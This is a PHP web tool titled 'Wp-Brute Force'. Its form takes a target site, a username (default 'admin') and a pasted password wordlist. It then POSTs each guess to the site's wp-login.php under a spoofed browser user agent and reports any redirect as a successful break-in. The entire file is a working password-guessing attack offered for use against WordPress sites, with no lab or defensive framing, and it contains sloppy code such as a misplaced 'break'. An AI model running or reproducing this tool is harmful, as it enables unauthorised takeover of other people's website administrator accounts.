<title>Wp-Brute Force</title>
<?php
include("../head.php");
?>

<?php
set_time_limit(0);
error_reporting(0);
 
class rintoar{
 
        private $host;
        private $user;
        private $open;
        private $lista;
 
  public function banner() {
   echo("    <html>
    <head>
    <style type='text/css'>

    .ext{
        color: blue;
    }
 
    .area{
        width:400px;
        height:350px;
        resize:none;
    }
 
    </style>
    </head>
    <body>
    <h1><center>WordPress Brute Force</center></h1>
    <form action='' method='POST'>
    <center>Host:<input type='text' name='host' class='con7' placeholder='http://tager.com/' size='40' > </center><br>
    <center>User:<input type='text' name='user' class='con7' value='admin' size='25'>    </center><br>
    <center>Wordlist</center>
    <center><textarea class='form-control con7' rows='10' name='lista'></textarea><br><br><center>
    <center><input type='Submit' class='kntd' value='Start'></center>
    </form>
    </body>
   </html>");

}
 
    public function extract_post() {
         $this->host = $_POST["host"];
         $this->user = $_POST["user"];
         $this->open = $_POST["lista"];
       }
 
       public function Xregex() {
         if(preg_match("@/wp-login.php@", $this->host)) {
             return true;
         } else {
            $this->host = $_POST["host"]."/wp-login.php";
         }
     }
 
      public function brute() {
           $lista = array_filter(explode("\n", $this->open));
           foreach($lista as $this->lista) {
           for($i=0; $i < count($this->lista); $i++) {
                        $this->Xcurl();
                     }
              }
       }
 
        private function cool() {
            echo "[+] Host:"."<font color='black'>{$this->host}</font>";
            echo " <br/>[+] User:"."<font color='black'>{$this->user}</font>";
            echo " <br/>[+] Pass:"."<font color='black'>{$this->lista}</font>";
        }
 
        private function Xcurl() {
            $curl = curl_init();
            curl_setopt($curl, CURLOPT_URL, $this->host);
            curl_setopt($curl, CURLOPT_USERAGENT, $this->useragent);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($curl, CURLOPT_POST, true);
            curl_setopt($curl, CURLOPT_POSTFIELDS, "log=$this->user&pwd=$this->lista&wp-submit=Login&redirect_to=$this->host/wp-admin/");
            $exec = curl_exec($curl);
            $http = curl_getinfo($curl, CURLINFO_HTTP_CODE);
            $this->cool();
            if($http == 302) {
                 echo "<font color='#00FF00'> <br/>[+] Success [+] Tinggal Login Aja</font><br>";
                 break;
            } else {
                echo "<font color='red'><br/>[+] Failed</font><br>";
            }
                curl_close($curl);
        }
}
 
$wp = new rintoar();
$wp->useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0";
$wp->banner();
$wp->extract_post();
$wp->Xregex();
$wp->brute();
        ?>
<br><br>